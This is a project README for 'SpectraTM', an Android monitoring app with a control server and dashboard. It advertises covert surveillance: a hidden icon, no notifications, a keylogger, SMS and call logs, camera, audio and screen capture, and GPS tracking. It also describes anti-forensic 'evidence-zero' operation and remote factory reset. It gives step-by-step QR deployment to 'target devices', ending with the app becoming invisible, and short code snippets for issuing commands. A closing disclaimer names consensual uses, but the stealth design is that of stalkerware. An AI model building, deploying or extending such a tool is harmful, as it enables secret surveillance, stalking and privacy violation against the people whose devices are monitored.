# SpectraTM v2.0 - Professional Monitoring System

## 🚀 System Overview

**SpectraTM** is a professional-grade, zero-evidence mobile monitoring system with advanced encryption, ghost operations, and comprehensive control capabilities.

## ✨ Key Features

### 🔒 Advanced Security
- **Noise_KK + PSK2** encryption with circular buffer evidence-zero operation
- **Key rotation** every 5 minutes with automatic cleanup
- **Ghost operations** for self-update and factory reset
- **Stealth mode** with invisible UI and background operation

### 📱 Mobile Capabilities  
- **Screen recording** with real-time streaming
- **Audio capture** and live monitoring
- **GPS tracking** with location history
- **SMS/Call monitoring** with full conversation logs
- **Keylogger** with app-specific capture
- **Camera access** for photo/video capture

### 🌐 Control Panel
- **React Dashboard** with real-time metrics and charts
- **Device management** with live status monitoring  
- **Heatmap visualization** with Mapbox integration
- **Log browser** with filtering and export capabilities
- **WebRTC streaming** for live audio/video feeds

### 🤖 Automation
- **Binary command system** for compact operations
- **Room management** for multi-device coordination
- **QR deployment** system for easy installation
- **CI/CD pipeline** for automated APK building

## 🏗️ Architecture

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Android APK   │◄──►│  Control Server │◄──►│ React Dashboard │
│                 │    │                 │    │                 │
│ • CoreService   │    │ • WebSocket Hub │    │ • Live Metrics  │
│ • GhostOpsMan   │    │ • Binary Cmds   │    │ • Device Control│
│ • KeyLogger     │    │ • File Upload   │    │ • Heatmap View  │
│ • DeviceAdmin   │    │ • QR Deploy     │    │ • Log Browser   │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

## 📂 Project Structure

```
spectratm-os/
├── android/                 # Android APK source
│   ├── app/src/main/java/   # Core services & activities
│   ├── app/build.gradle     # Build configuration
│   └── AndroidManifest.xml  # Permissions & components
├── control/                 # Server & dashboard
│   ├── server.js           # Main WebSocket server
│   ├── src/                # React dashboard source
│   ├── commands.js         # Binary command handlers
│   ├── rooms.js           # Room management system
│   └── qr-deployment.js   # QR deployment system
├── noise/                  # Encryption system
│   └── keygen.js          # Noise_KK + PSK2 implementation
└── .github/workflows/     # CI/CD automation
    └── build-apk.yml      # Automated APK building
```

## 🚀 Quick Start

### 1. Deploy Server

#### Local Development
```bash
cd control
npm install
npm run build
node server.js
```

#### Render Deployment
```bash
git push origin main  # Automatic deployment via render.yaml
```

### 2. Generate Deployment QR

Access the dashboard at `http://your-server.com/dashboard` and:

1. Navigate to **Deploy** section
2. Click **Generate QR Code**  
3. Set expiration time (default: 24 hours)
4. Share QR code with target devices

### 3. Install on Android Device

1. **Scan QR code** with target Android device
2. **Enable "Unknown Sources"** in Android settings
3. **Download and install** the APK file
4. **Grant all permissions** when prompted
5. **App becomes invisible** and starts monitoring

## 🎛️ Control Interface

### Main Dashboard (`/dashboard`)
- **Device overview** with status indicators
- **Real-time metrics** and activity charts
- **Quick actions** for common operations

### Device Control (`/dash/:deviceId`)
- **Live streaming** via WebRTC
- **Remote commands** (screen, audio, photo, location)
- **Ghost operations** (self-update, factory reset)

### Location View (`/heatmap`)
- **Interactive map** with device locations
- **Heatmap visualization** of activity density
- **Geofencing alerts** and location history

### System Logs (`/logz`)  
- **Real-time log viewer** with filtering
- **Export capabilities** to text files
- **Error tracking** and system monitoring

## 🔧 Advanced Features

### Binary Commands
Compact command format for efficient communication:

```javascript
// Screen capture command
const cmd = new Uint8Array([0x01, 0x00, 0x1E, 0x00]); // START_SCREEN, 30sec
ws.send(cmd);
```

### Ghost Operations
Invisible operations that leave no traces:

```kotlin
// Self-update with signature validation
ghostOps.performSelfUpdate(newApkUrl, expectedChecksum)

// Factory reset with secure wipe
ghostOps.factoryReset(wipeExternalStorage = true)
```

### Room Management
Organize devices into groups for coordinated operations:

```javascript
// Join device to room
roomManager.joinRoom(deviceId, "office-floor-2");

// Broadcast command to all devices in room
roomManager.broadcastToRoom("office-floor-2", command);
```

## 🔐 Security Implementation

### Encryption Flow
1. **Noise_KK handshake** establishes secure channel
2. **PSK2 extension** adds pre-shared key authentication  
3. **Circular buffer** automatically deletes old evidence
4. **Key rotation** every 5 minutes prevents replay attacks

### Stealth Features
- **Invisible app icon** and name
- **Background service** with battery optimization bypass
- **No notification indicators** or visible UI elements
- **Ghost update system** for remote maintenance

### Evidence-Zero Operation  
- **Circular buffer** overwrites old data automatically
- **Memory-only storage** for sensitive operations
- **Secure deletion** of temporary files
- **No persistent traces** on device filesystem

## 🌍 Deployment Options

### Render (Recommended)
Fully automated deployment with the provided `render.yaml`:
- Automatic builds from GitHub
- Environment variable management
- HTTPS certificate handling  
- Horizontal scaling support

### Self-Hosted
Deploy on your own infrastructure:
- VPS with Node.js runtime
- Reverse proxy (nginx/Apache)
- SSL certificate (Let's Encrypt)
- Firewall configuration

### Cloud Platforms
Compatible with major cloud providers:
- **Heroku** - Simple git-based deployment
- **DigitalOcean App Platform** - Container deployment  
- **AWS/Azure** - Enterprise-grade infrastructure
- **Google Cloud Run** - Serverless container hosting

## ⚡ Performance Specs

### Server Capacity
- **1000+ concurrent devices** on standard VPS
- **Real-time data processing** with WebSocket optimization
- **File upload/download** with 4MB limit per transfer
- **Automatic cleanup** of old logs and temporary files

### Mobile Efficiency  
- **Battery optimized** services with smart scheduling
- **Network adaptive** streaming quality
- **Storage efficient** with circular buffer system
- **CPU throttling** during low-priority operations

## 📋 API Reference

### Device Management
```javascript
GET /api/devices              // List all devices
GET /api/device/:id           // Get device details  
POST /api/command/:id         // Send command to device
GET /api/metrics              // System metrics
```

### QR Deployment
```javascript
POST /api/deploy/generate     // Generate deployment QR
POST /api/deploy/bulk         // Bulk deployment codes
GET /api/deploy/history       // Deployment history
POST /api/deploy/revoke/:id   // Revoke deployment
```

### File Operations
```javascript
POST /upload                  // Upload encrypted file
GET /download/:filename       // Download decrypted file
```

## 🛡️ Legal & Ethics

**IMPORTANT**: This system is designed for:
- ✅ **Parental monitoring** of minor children's devices
- ✅ **Corporate security** on company-owned devices  
- ✅ **Personal device backup** and recovery
- ✅ **Security research** in controlled environments

**DO NOT USE FOR**:
- ❌ Monitoring devices without explicit consent
- ❌ Corporate espionage or unauthorized surveillance
- ❌ Stalking, harassment, or privacy violation
- ❌ Any illegal activities in your jurisdiction

## 📞 Support

For technical support or security reports:
- **GitHub Issues**: Report bugs and feature requests
- **Security Email**: security@spectratm.com  
- **Documentation**: Full API docs at `/docs`

---

**SpectraTM v2.0** - Professional monitoring with zero compromise on security.

*Built with ❤️ for ethical monitoring solutions*